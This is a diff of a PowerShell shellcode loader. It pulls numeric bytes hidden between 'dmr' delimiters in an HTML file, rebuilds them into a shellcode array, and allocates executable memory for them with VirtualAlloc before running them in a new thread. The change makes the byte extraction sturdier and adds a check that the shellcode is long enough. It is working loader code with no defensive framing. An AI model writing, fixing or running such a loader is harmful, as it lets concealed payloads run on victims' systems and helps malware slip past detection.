@@ -165,16 +165,25 @@ function Invoke-CreateThread {
 
 
 
-# 3. Reassemble Byte Array (Your existing logic)
+# 3. Reassemble Byte Array
 $htmlContent = Get-Content $htmlPath -Raw
-$pattern = '(?<=dmr)(.*?)(?=dmr)'
-$match = [regex]::Match($htmlContent, $pattern).Value
-$byteArray = $match.Split("dmr") | Where-Object { $_ -ne "" } | ForEach-Object { [byte]$_ }
 
-# --- PASTE THE Invoke-VirtualAlloc AND Invoke-CreateThread FUNCTIONS HERE ---
+# Use a simpler split if the regex is being finicky
+$Delim = "dmr"
+$parts = $htmlContent -split $Delim
+# Filter out the HTML fluff and keep only the numeric bytes
+$byteArray = $parts | Where-Object { $_ -match '^\d+$' } | ForEach-Object { [byte]$_ }
+
+Write-Host "Reassembled $($byteArray.Length) bytes."
+
+if ($byteArray.Length -lt 10) {
+    Write-Error "Shellcode too short! Check if test.html is formatted correctly with 'dmr' delimiters."
+    return
+}
+
+
 
 # 4. Execution Logic
-Write-Host "Reassembled $($byteArray.Length) bytes."
 
 # Allocate memory (0x3000 = Commit/Reserve, 0x40 = Execute/Read/Write)
 $ShellcodeAddr = Invoke-VirtualAlloc -lpAddress ([IntPtr]::Zero) -dwSize $byteArray.Length -flAllocationType 0x3000 -flProtect 0x40
